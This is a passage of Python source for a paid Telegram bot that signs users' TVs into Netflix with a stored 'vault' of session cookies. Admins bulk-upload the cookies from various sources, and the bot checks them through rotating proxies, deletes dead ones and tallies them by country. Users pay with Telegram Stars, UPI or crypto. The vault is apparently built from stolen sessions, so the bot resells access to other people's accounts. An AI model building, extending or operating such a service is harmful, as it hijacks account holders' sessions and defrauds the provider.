            f"❌ <b>ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ ᴛᴠ ᴄᴏᴅᴇ</b>\n\n"
            f"📺 ᴄᴏᴅᴇ: <code>{tv_code}</code>\n\n"
            f"Please check your TV and enter a fresh code.\n"
            f"💡 <i>TV codes expire in ~15 minutes.</i>",
            parse_mode=ParseMode.HTML, reply_markup=error_kb())
    else:
        await status_msg.edit_text(
            f"❌ <b>ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n⚠️ {result.get('error','Unknown')}\nTry again with a fresh code.",
            parse_mode=ParseMode.HTML, reply_markup=error_kb())

# ══════════════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════════════
async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; user = q.from_user; data = q.data
    await q.answer()

    if is_banned(user.id) and data != "back_start":
        await q.answer("🚫 You are banned.", show_alert=True); return

    # ── Navigation ────────────────────────────────────────────────────
    if data == "back_start":
        context.user_data.clear()
        await _send_start(q, user)

    elif data == "noop":
        pass

    elif data == "cancel_state":
        context.user_data.clear()
        await q.edit_message_text(s(user.id, "cancelled"), parse_mode=ParseMode.HTML,
                                  reply_markup=back_kb())

    # ── Activate TV menu ──────────────────────────────────────────────
    elif data == "activate_menu":
        context.user_data.clear()
        await q.edit_message_text(s(user.id, "activate_method"),
                                  parse_mode=ParseMode.HTML, reply_markup=activate_menu_kb())

    elif data == "free_activate":
        context.user_data["state"] = ST_TV_FREE
        await q.edit_message_text(s(user.id, "free_activate_prompt"),
                                  parse_mode=ParseMode.HTML, reply_markup=free_activate_kb())

    elif data == "how_to_find":
        await q.edit_message_text(
            "📺 <b>ʜᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴛᴠ ᴄᴏᴅᴇ</b>\n\n"
            "1️⃣ Open <b>Netflix</b> on your TV\n"
            "2️⃣ Go to <b>Sign In</b>\n"
            "3️⃣ Select <b>'Use a Sign-In Code'</b>\n"
            "4️⃣ Note the <b>8-digit code</b>\n\n"
            "⏰ <i>Codes expire after ~15 minutes!</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="free_activate")]]))

    # ── Own cookie menu ───────────────────────────────────────────────
    elif data == "own_cookie_menu":
        used = count_user_cookies(user.id)
        if used >= MAX_USER_COOKIES:
            await q.edit_message_text(
                f"⚠️ <b>ꜱʟᴏᴛꜱ ғᴜʟʟ!</b>\nYou already have {MAX_USER_COOKIES} cookies stored.\n"
                f"Delete old ones first to add more.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb()); return
        await q.edit_message_text(s(user.id, "own_cookie_menu", used=used),
                                  parse_mode=ParseMode.HTML, reply_markup=own_cookie_format_kb())

    elif data == "send_txt":
        context.user_data["state"] = ST_COOKIE_TXT
        await q.edit_message_text(s(user.id, "send_txt_prompt"),
                                  parse_mode=ParseMode.HTML, reply_markup=cancel_kb())

    elif data == "send_zip":
        context.user_data["state"] = ST_COOKIE_ZIP
        await q.edit_message_text(s(user.id, "send_zip_prompt"),
                                  parse_mode=ParseMode.HTML, reply_markup=cancel_kb())

    # ── My Stats ──────────────────────────────────────────────────────
    elif data == "my_stats":
        await _show_stats(q.edit_message_text, user)

    # ── History ───────────────────────────────────────────────────────
    elif data.startswith("history:"):
        page = int(data.split(":")[1])
        c = db()
        total = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE user_id=?", (user.id,)).fetchone()["n"]
        rows  = c.execute(
            "SELECT tv_code,success,ts FROM login_log WHERE user_id=? ORDER BY ts DESC LIMIT ? OFFSET ?",
            (user.id, HISTORY_PAGE_SIZE, (page-1)*HISTORY_PAGE_SIZE)
        ).fetchall(); c.close()

        if total == 0:
            await q.edit_message_text(
                "📜 ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ʜɪꜱᴛᴏʀʏ\n━━━━━━━━━━━━━━━━━━━━\nNo history yet.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb()); return

        total_pages = max(1, (total + HISTORY_PAGE_SIZE - 1) // HISTORY_PAGE_SIZE)
        lines = [f"📜 ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ʜɪꜱᴛᴏʀʏ\n━━━━━━━━━━━━━━━━━━━━",
                 f"📊 ᴛᴏᴛᴀʟ: {total} | ᴘᴀɢᴇ {page}/{total_pages}\n"]
        for r in rows:
            icon = "✅" if r["success"] else "❌"
            ts_str = datetime.fromtimestamp(r["ts"]).strftime("%Y-%m-%d %H:%M")
            lines.append(f"{icon} {ts_str} | code=<code>{r['tv_code']}</code>")
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        await q.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML,
                                  reply_markup=history_kb(page, total_pages))

    # ── Help ──────────────────────────────────────────────────────────
    elif data == "help":
        await q.edit_message_text(_help_text(), parse_mode=ParseMode.HTML, reply_markup=back_kb())

    # ── Language ──────────────────────────────────────────────────────
    elif data == "lang_menu":
        await q.edit_message_text(s(user.id, "lang_menu"), parse_mode=ParseMode.HTML, reply_markup=lang_kb())

    elif data.startswith("setlang_"):
        lang = data[len("setlang_"):]
        set_user_lang(user.id, lang)
        lang_name = "🇬🇧 English" if lang == "en" else "🇮🇳 Hinglish"
        await q.edit_message_text(
            f"✅ Language set to <b>{lang_name}</b>!", parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_start")]]))

    # ── Buy Credits ───────────────────────────────────────────────────
    elif data == "buy_menu":
        await q.edit_message_text(
            "💎 <b>ʙᴜʏ ᴄʀᴇᴅɪᴛꜱ / ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ</b>\n\nᴄʜᴏᴏꜱᴇ ᴀ ᴘʟᴀɴ:",
            parse_mode=ParseMode.HTML, reply_markup=buy_menu_kb())

    elif data.startswith("buy_plan_"):
        plan_key = data[len("buy_plan_"):]
        plan = PLANS.get(plan_key)
        if not plan: await q.answer("Unknown plan.", show_alert=True); return
        await q.edit_message_text(
            f"💎 <b>{plan['label']}</b>\n\n📦 {plan['desc']}\n\n"
            f"💵 ᴘʀɪᴄᴇꜱ:\n  ⭐ {plan['stars']} Stars\n  ₹{plan['inr']} UPI\n  ${plan['usd_cents']/100:.2f} Crypto",
            parse_mode=ParseMode.HTML, reply_markup=plan_pay_kb(plan_key))

    elif data.startswith("pay_stars_"):
        plan_key = data[len("pay_stars_"):]
        plan = PLANS.get(plan_key)
        if not plan: return
        await context.bot.send_invoice(
            chat_id=user.id, title=f"Netflix Bot — {plan['label']}", description=plan["desc"],
            payload=f"{plan_key}:{user.id}", currency="XTR",
            prices=[LabeledPrice(label=plan["label"], amount=plan["stars"])], provider_token="")

    elif data.startswith("pay_upi_"):
        plan_key = data[len("pay_upi_"):]
        plan = PLANS.get(plan_key)
        if not plan: return
        await q.edit_message_text(
            f"💸 <b>ᴜᴘɪ ᴘᴀʏᴍᴇɴᴛ</b>\n\nPlan: <b>{plan['label']}</b>  Amount: <b>₹{plan['inr']}</b>\n\n"
            f"📲 Pay to:\n<code>{UPI_ID}</code>\n\nAfter paying tap below — admin will verify & activate.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ ɪ'ᴠᴇ ᴘᴀɪᴅ", callback_data=f"upi_done_{plan_key}")],
                [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data=f"buy_plan_{plan_key}")],
            ]))

    elif data.startswith("upi_done_"):
        plan_key = data[len("upi_done_"):]; plan = PLANS.get(plan_key)
        if not plan: return
        c = db(); c.execute("INSERT INTO payments (user_id,plan_key,method,amount) VALUES (?,?,?,?)",
                            (user.id, plan_key, "UPI", f"₹{plan['inr']}")); c.commit(); c.close()
        for aid in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    aid,
                    f"💸 <b>ᴜᴘɪ ᴘᴀʏᴍᴇɴᴛ ᴄʟᴀɪᴍᴇᴅ</b>\n"
                    f"User: {user.first_name} (@{user.username or 'N/A'}) — <code>{user.id}</code>\n"
                    f"Plan: <b>{plan['label']}</b>  ₹{plan['inr']}\n\n"
                    f"/approvepay {user.id} {plan_key}",
                    parse_mode=ParseMode.HTML)
            except Exception: pass
        await q.edit_message_text(
            f"✅ <b>ᴘᴀʏᴍᴇɴᴛ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ꜱᴇɴᴛ!</b>\nAdmin will activate your plan shortly.\n"
            f"@{SUPPORT_USERNAME}", parse_mode=ParseMode.HTML, reply_markup=back_kb())

    elif data.startswith("pay_crypto_"):
        plan_key = data[len("pay_crypto_"):]; plan = PLANS.get(plan_key)
        if not plan: return
        await q.edit_message_text(
            f"₿ <b>ᴄʀʏᴘᴛᴏ ᴘᴀʏᴍᴇɴᴛ</b>\n\nPlan: <b>{plan['label']}</b>  ${plan['usd_cents']/100:.2f}\n\n"
            f"🔷 USDT TRC20:\n<code>{CRYPTO_USDT_ADDR}</code>\n\n"
            f"🟠 BTC:\n<code>{CRYPTO_BTC_ADDR}</code>\n\nSend exact amount then tap below.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ ɪ'ᴠᴇ ᴘᴀɪᴅ", callback_data=f"crypto_done_{plan_key}")],
                [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data=f"buy_plan_{plan_key}")],
            ]))

    elif data.startswith("crypto_done_"):
        plan_key = data[len("crypto_done_"):]; plan = PLANS.get(plan_key)
        if not plan: return
        c = db(); c.execute("INSERT INTO payments (user_id,plan_key,method,amount) VALUES (?,?,?,?)",
                            (user.id, plan_key, "Crypto", f"${plan['usd_cents']/100:.2f}")); c.commit(); c.close()
        for aid in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    aid,
                    f"₿ <b>ᴄʀʏᴘᴛᴏ ᴘᴀʏᴍᴇɴᴛ ᴄʟᴀɪᴍᴇᴅ</b>\n"
                    f"User: {user.first_name} <code>{user.id}</code>\n"
                    f"Plan: {plan['label']} — ${plan['usd_cents']/100:.2f}\n\n"
                    f"/approvepay {user.id} {plan_key}",
                    parse_mode=ParseMode.HTML)
            except Exception: pass
        await q.edit_message_text(
            f"✅ <b>ᴘᴀʏᴍᴇɴᴛ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ꜱᴇɴᴛ!</b>\n@{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML, reply_markup=back_kb())

# ══════════════════════════════════════════════════════════════════════
#  TELEGRAM STARS CHECKOUT
# ══════════════════════════════════════════════════════════════════════
async def pre_checkout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.pre_checkout_query.answer(ok=True)

async def stars_payment_success(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payment = update.message.successful_payment
    parts   = payment.invoice_payload.split(":")
    if len(parts) != 2: return
    plan_key, user_id = parts[0], int(parts[1])
    ok, desc = apply_plan(user_id, plan_key)
    plan = PLANS.get(plan_key, {})
    c = db()
    c.execute("INSERT INTO payments (user_id,plan_key,method,amount,status) VALUES (?,?,?,?,?)",
              (user_id, plan_key, "Stars", str(plan.get("stars","?")), "completed"))
    c.commit(); c.close()
    await update.message.reply_text(
        f"✅ <b>ᴘᴀʏᴍᴇɴᴛ ꜱᴜᴄᴄᴇꜱꜱғᴜʟ!</b>\n💎 Plan: <b>{plan.get('label',plan_key)}</b>\n📦 {desc}\n\nUse /tv to login!",
        parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════════════════════
#  MESSAGE HANDLER — state machine (TV codes + file uploads)
# ══════════════════════════════════════════════════════════════════════
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user  = update.effective_user
    msg   = update.message
    state = context.user_data.get("state")

    if is_banned(user.id): return

    # ── File upload states ────────────────────────────────────────────
    if state in (ST_COOKIE_TXT, ST_COOKIE_ZIP):
        if not msg.document:
            await msg.reply_text("📎 Please send a file.", reply_markup=cancel_kb()); return

        fname = (msg.document.file_name or "").lower()
        expected = ".txt" if state == ST_COOKIE_TXT else ".zip"
        if not fname.endswith(expected):
            await msg.reply_text(f"❌ Please send a <b>{expected}</b> file.",
                                 parse_mode=ParseMode.HTML, reply_markup=cancel_kb()); return

        slots_free = MAX_USER_COOKIES - count_user_cookies(user.id)
        if slots_free <= 0:
            context.user_data.clear()
            await msg.reply_text("⚠️ <b>ꜱʟᴏᴛꜱ ғᴜʟʟ!</b> Max 5 cookies per user.",
                                 parse_mode=ParseMode.HTML, reply_markup=back_kb()); return

        status_msg = await msg.reply_text("📥 <b>Processing your cookie file...</b>", parse_mode=ParseMode.HTML)
        try:
            file = await context.bot.get_file(msg.document.file_id)
            raw  = await file.download_as_bytearray()
            added = skipped = 0

            if state == ST_COOKIE_ZIP:
                with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
                    txt_files = [n for n in zf.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
                    txt_files = txt_files[:slots_free]
                    for name in txt_files:
                        try:
                            content = zf.read(name).decode("utf-8", errors="ignore")
                            found   = extract_all_cookies_from_content(content)
                            n       = store_user_cookies(user.id, found, os.path.basename(name))
                            added  += n
                            if n == 0: skipped += 1
                        except Exception: skipped += 1
            else:
                content = bytes(raw).decode("utf-8", errors="ignore")
                found   = extract_all_cookies_from_content(content)
                added   = store_user_cookies(user.id, found, msg.document.file_name)
                if added == 0: skipped = 1

            if added == 0:
                await status_msg.edit_text(
                    "❌ <b>ɴᴏ ᴠᴀʟɪᴅ ᴄᴏᴏᴋɪᴇꜱ ғᴏᴜɴᴅ!</b>\n"
                    "Make sure the file is in Netscape format.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 ᴛʀʏ ᴀɢᴀɪɴ", callback_data="own_cookie_menu")],
                        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",       callback_data="back_start")],
                    ])); context.user_data.clear(); return

            # Cookie saved — now ask for TV code
            context.user_data["state"] = ST_TV_OWN
            total_now = count_user_cookies(user.id)
            await status_msg.edit_text(
                f"✅ <b>{added} ᴄᴏᴏᴋɪᴇ(ꜱ) ꜱᴀᴠᴇᴅ!</b>  🔑 Slots: {total_now}/5\n\n"
                + s(user.id, "own_cookie_prompt"),
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb())
        except Exception as e:
            context.user_data.clear()
            await status_msg.edit_text(f"❌ Failed: <code>{e}</code>", parse_mode=ParseMode.HTML,
                                       reply_markup=back_kb())
        return

    # ── TV code states ────────────────────────────────────────────────
    if state in (ST_TV_FREE, ST_TV_OWN):
        raw     = (msg.text or "").strip()
        tv_code = re.sub(r"\D", "", raw)

        if len(tv_code) != 8:
            await msg.reply_text(
                f"❌ <b>ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.</b>\nDigits: <b>{len(tv_code)}</b> — need exactly 8.\n"
                f"💡 Example: <code>1234-5678</code>",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb()); return

        context.user_data.clear()
        if state == ST_TV_FREE:
            await _run_free_login(update, context, user, tv_code, is_callback=False)
        else:
            status_msg = await msg.reply_text(
                f"⠋ <b>ᴜꜱɪɴɢ ʏᴏᴜʀ ᴄᴏᴏᴋɪᴇ...</b>\n\n📺 ᴄᴏᴅᴇ: <code>{tv_code}</code>",
                parse_mode=ParseMode.HTML)
            await _run_own_login(context, user, tv_code, status_msg)
        return

    # ── Not in a state — ignore silently ─────────────────────────────

# ══════════════════════════════════════════════════════════════════════
#  ADMIN — FILE UPLOAD
# ══════════════════════════════════════════════════════════════════════
async def _process_admin_upload(update, context, doc):
    fname = (doc.file_name or "").lower()
    if not fname.endswith((".txt", ".json", ".zip")):
        await update.message.reply_text("❌ Only .txt .json .zip accepted."); return
    status_msg = await update.message.reply_text("📥 <b>Downloading...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        raw  = await file.download_as_bytearray()
        await status_msg.edit_text("⚙️ <b>Parsing cookies...</b>", parse_mode=ParseMode.HTML)
        added = skipped = 0
        if fname.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
                for name in zf.namelist():
                    if name.endswith("/") or name.startswith(("__MACOSX",".")): continue
                    if not name.lower().endswith((".txt",".json")): skipped += 1; continue
                    try:
                        content = zf.read(name).decode("utf-8", errors="ignore")
                        found   = extract_all_cookies_from_content(content)
                        n       = store_cookies_bulk(found, source=os.path.basename(name))
                        added  += n
                        if n == 0: skipped += 1
                    except Exception: skipped += 1
        else:
            content = bytes(raw).decode("utf-8", errors="ignore")
            found   = extract_all_cookies_from_content(content)
            added   = store_cookies_bulk(found, source=doc.file_name)
            if added == 0: skipped = 1
        vault_count = count_vault()
        global _low_vault_alerted
        if vault_count > VAULT_LOW_THRESHOLD: _low_vault_alerted = False
        health = ("🟢 Vault is well stocked!" if vault_count > 200
                  else "🟡 Vault is getting low." if vault_count > 30 else "🔴 Vault is critically low!")
        await status_msg.edit_text(
            f"✅ <b>Upload Complete!</b>\n📥 Added: <b>{added}</b>\n⏭️ Skipped: <b>{skipped}</b>\n"
            f"🍪 Total alive: <b>{vault_count}</b>\n\n{health}", parse_mode=ParseMode.HTML)
    except Exception as e:
        await status_msg.edit_text(f"❌ Failed: <code>{e}</code>", parse_mode=ParseMode.HTML)

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in ADMIN_IDS:
        await _process_admin_upload(update, context, update.message.document); return
    # Route to user state machine for non-admins
    await message_handler(update, context)

# ══════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════
def _admin(fn):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Admin only."); return
        return await fn(update, context)
    wrapper.__name__ = fn.__name__; return wrapper

@_admin
async def cmd_adminstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    now = time.time(); vault_stats = count_all_cookies()
    source_rows = get_cookie_source_stats(); country_rows = get_cookie_country_stats()
    with active_lock:
        a5m = sum(1 for t in active_users.values() if now - t <= 300)
        a1h = sum(1 for t in active_users.values() if now - t <= 3600)
    c = db()
    total_users  = c.execute("SELECT COUNT(*) AS n FROM users").fetchone()["n"]
    banned_users = c.execute("SELECT COUNT(*) AS n FROM users WHERE banned=1").fetchone()["n"]
    unltd_users  = c.execute("SELECT COUNT(*) AS n FROM users WHERE unlimited_until>?", (int(now),)).fetchone()["n"]
    db_success   = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE success=1").fetchone()["n"]
    db_failed    = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE success=0").fetchone()["n"]
    last_hr      = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE ts>strftime('%s','now','-1 hour')").fetchone()["n"]
    last_day     = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE ts>strftime('%s','now','-1 day')").fetchone()["n"]
    rev_stars    = c.execute("SELECT COALESCE(SUM(CAST(amount AS REAL)),0) AS n FROM payments WHERE method='Stars' AND status='completed'").fetchone()["n"]
    pending_pays = c.execute("SELECT COUNT(*) AS n FROM payments WHERE status='pending'").fetchone()["n"]
    new_today    = c.execute("SELECT COUNT(*) AS n FROM users WHERE joined_at>strftime('%s','now','-1 day')").fetchone()["n"]
    c.close()
    success_rate = f"{db_success*100//(db_success+db_failed)}%" if (db_success+db_failed) else "N/A"
    src_lines = "\n".join(f"   <code>{r['source'][:20]}</code>: {r['alive']} alive / {r['n']}" for r in source_rows[:5]) or "   (none)"
    ctr_lines = "\n".join(f"   {get_flag(r['country'])} {r['country']}: {r['n']}" for r in country_rows[:5]) or "   (none)"
    with stats_lock: started = rt_stats["started_at"]
    await update.message.reply_text(
        f"📊 <b>ᴀᴅᴍɪɴ ᴅᴀꜱʜʙᴏᴀʀᴅ</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n⏱ Started: {started}\n\n"
        f"🍪 <b>VAULT</b>\n   Alive: <b>{vault_stats['alive']}</b>  Dead: {vault_stats['dead']}\n\n"
        f"📁 <b>TOP SOURCES</b>\n{src_lines}\n\n"
        f"🌍 <b>TOP COUNTRIES</b>\n{ctr_lines}\n\n"
        f"👥 <b>USERS</b>\n   Total: <b>{total_users}</b>  New today: {new_today}  Banned: {banned_users}  Unlimited: {unltd_users}\n"
        f"   Active 5m: {a5m}  |  1h: {a1h}\n\n"
        f"📈 <b>LOGINS</b>\n   {db_success}✅ / {db_failed}❌  Rate: {success_rate}\n"
        f"   Last 1h: {last_hr}  |  24h: {last_day}\n\n"
        f"💰 <b>REVENUE</b>\n   Stars: <b>{int(rev_stars)} ⭐</b>  |  Pending: {pending_pays}\n\n"
        f"🔄 <b>PROXIES</b>: {len(_live_proxies)} live",
        parse_mode=ParseMode.HTML)

@_admin
async def cmd_approvepay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2: await update.message.reply_text("Usage: /approvepay USER_ID PLAN_KEY"); return
    try:
        uid = int(args[0]); plan_key = args[1]
        ok, desc = apply_plan(uid, plan_key)
        if not ok: await update.message.reply_text(f"❌ Unknown plan: {plan_key}"); return
        plan = PLANS[plan_key]
        c = db(); c.execute("UPDATE payments SET status='completed' WHERE user_id=? AND plan_key=? AND status='pending'", (uid, plan_key)); c.commit(); c.close()
        await update.message.reply_text(f"✅ Approved <b>{plan['label']}</b> for <code>{uid}</code>.", parse_mode=ParseMode.HTML)
        try:
            await context.bot.send_message(uid, f"🎉 <b>ᴘʟᴀɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!</b>\n💎 {plan['label']}\n📦 {desc}\n\nUse /tv to login!", parse_mode=ParseMode.HTML)
        except Exception: pass
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_rejectpay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /rejectpay USER_ID"); return
    try:
        uid = int(context.args[0])
        c = db(); c.execute("UPDATE payments SET status='rejected' WHERE user_id=? AND status='pending'", (uid,)); c.commit(); c.close()
        await update.message.reply_text(f"✅ Rejected pending payments for <code>{uid}</code>.", parse_mode=ParseMode.HTML)
        try: await context.bot.send_message(uid, f"❌ <b>ᴘᴀʏᴍᴇɴᴛ ʀᴇᴊᴇᴄᴛᴇᴅ</b>\nContact @{SUPPORT_USERNAME}.", parse_mode=ParseMode.HTML)
        except Exception: pass
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2: await update.message.reply_text("Usage: /addcredits USER_ID AMOUNT"); return
    try:
        uid = int(args[0]); amount = int(args[1])
        c = db(); c.execute("UPDATE users SET bonus_credits=bonus_credits+? WHERE user_id=?", (amount,uid)); c.commit(); c.close()
        await update.message.reply_text(f"✅ Added <b>{amount}</b> credits to <code>{uid}</code>.", parse_mode=ParseMode.HTML)
        try: await context.bot.send_message(uid, f"🎁 <b>{amount} bonus credits</b> added!", parse_mode=ParseMode.HTML)
        except Exception: pass
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /ban USER_ID"); return
    try:
        uid = int(context.args[0])
        c = db(); c.execute("UPDATE users SET banned=1 WHERE user_id=?", (uid,)); c.commit(); c.close()
        await update.message.reply_text(f"🚫 Banned <code>{uid}</code>.", parse_mode=ParseMode.HTML)
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /unban USER_ID"); return
    try:
        uid = int(context.args[0])
        c = db(); c.execute("UPDATE users SET banned=0 WHERE user_id=?", (uid,)); c.commit(); c.close()
        await update.message.reply_text(f"✅ Unbanned <code>{uid}</code>.", parse_mode=ParseMode.HTML)
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /userinfo USER_ID"); return
    try:
        uid = int(context.args[0]); row = get_user_row(uid)
        if not row: await update.message.reply_text("User not found."); return
        credits_left, reset_in, unlimited_flag = get_credits_status(uid)
        ban_status  = "🚫 Banned" if row.get("banned") else "✅ Active"
        plan_status = (f"♾️ Unlimited until {fmt_ts(row.get('unlimited_until',0))}"
                       if unlimited_flag else f"{credits_left} credits left")
        await update.message.reply_text(
            f"👤 <b>User Info</b>\nID: <code>{uid}</code>\nName: {row.get('first_name','?')}\n"
            f"@{row.get('username') or 'N/A'}\nStatus: {ban_status}\nPlan: {plan_status}\n"
            f"Bonus: {row.get('bonus_credits',0)}  Total: {row.get('total_logins',0)}  ✅: {row.get('successful_logins',0)}\n"
            f"Joined: {fmt_ts(row.get('joined_at',0))}", parse_mode=ParseMode.HTML)
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_resetcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /resetcredits USER_ID"); return
    try:
        uid = int(context.args[0])
        c = db(); c.execute("UPDATE users SET credits_used=0,last_reset=0,bonus_credits=0 WHERE user_id=?", (uid,)); c.commit(); c.close()
        await update.message.reply_text(f"✅ Credits reset for <code>{uid}</code>.", parse_mode=ParseMode.HTML)
    except Exception as e: await update.message.reply_text(f"❌ {e}")

@_admin
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /broadcast message"); return
    msg = " ".join(context.args)
    c = db(); uids = [r["user_id"] for r in c.execute("SELECT user_id FROM users WHERE banned=0").fetchall()]; c.close()
    sent = failed = 0
    for uid in uids:
        try:
            await context.bot.send_message(uid, f"📢 <b>ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1; await asyncio.sleep(0.05)
        except Exception: failed += 1
    await update.message.reply_text(f"📢 Done. ✅ {sent} | ❌ {failed}", parse_mode=ParseMode.HTML)

@_admin
async def cmd_clearvault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    c = db(); cur = c.cursor(); cur.execute("DELETE FROM cookies"); deleted = cur.rowcount; c.commit(); c.close()
    await update.message.reply_text(f"🗑️ Cleared <b>{deleted}</b> cookies.", parse_mode=ParseMode.HTML)

@_admin
async def cmd_payments(update: Update, context: ContextTypes.DEFAULT_TYPE):
    c = db()
    rows = c.execute(
        "SELECT p.user_id, u.first_name, p.plan_key, p.method, p.amount, p.status, p.ts "
        "FROM payments p LEFT JOIN users u ON p.user_id=u.user_id ORDER BY p.ts DESC LIMIT 10"
    ).fetchall(); c.close()
    if not rows: await update.message.reply_text("No payments yet."); return
    lines = ["💰 <b>Recent Payments</b>\n"]
    for r in rows:
        icon = {"completed":"✅","pending":"⏳","rejected":"❌"}.get(r["status"], r["status"])
        plan = PLANS.get(r["plan_key"],{}).get("label", r["plan_key"])
        lines.append(f"{icon} {r['first_name'] or '?'} <code>{r['user_id']}</code> — {plan} {r['method']} {r['amount']} [{fmt_ts(r['ts'])}]")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

@_admin
async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    c = db()
    rows = c.execute("SELECT user_id,first_name,username,total_logins,successful_logins,banned FROM users ORDER BY total_logins DESC LIMIT 10").fetchall(); c.close()
    if not rows: await update.message.reply_text("No users yet."); return
    lines = ["👥 <b>Top 10 Users</b>\n"]
    for i, r in enumerate(rows, 1):
        uname = f"@{r['username']}" if r["username"] else f"<code>{r['user_id']}</code>"
        ban   = " 🚫" if r["banned"] else ""
        lines.append(f"{i}. {r['first_name'] or '?'} ({uname}){ban} — <b>{r['successful_logins']}</b>✅/{r['total_logins']}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

@_admin
async def cmd_testvault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    n = min(int(context.args[0]) if context.args else 20, 200)
    msg = await update.message.reply_text(f"🔍 Validating up to {n} cookies...")
    c = db(); rows = c.execute("SELECT id,data FROM cookies WHERE alive=1 ORDER BY last_checked ASC LIMIT ?", (n,)).fetchall(); c.close()
    checked = dead = 0
    for row in rows:
        try: cdict = json.loads(row["data"])
        except Exception: cdict = None
        if cdict:
            valid, info = validate_and_get_info(cdict, _get_proxy())
            c2 = db()
            if valid:
                c2.execute("UPDATE cookies SET alive=1,last_checked=?,country=? WHERE id=?",
                           (int(time.time()), info.get("country",""), row["id"]))
            else:
                c2.execute("DELETE FROM cookies WHERE id=?", (row["id"],)); dead += 1
            c2.commit(); c2.close(); checked += 1
    await msg.edit_text(f"✅ Checked: {checked} | Deleted dead: {dead} | Alive: {count_vault()}")

@_admin
async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text(
            "📎 <b>/upload usage:</b>\n1. Send cookie file\n2. Reply to it with /upload",
            parse_mode=ParseMode.HTML); return
    await _process_admin_upload(update, context, replied.document)

@_admin
async def cmd_addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
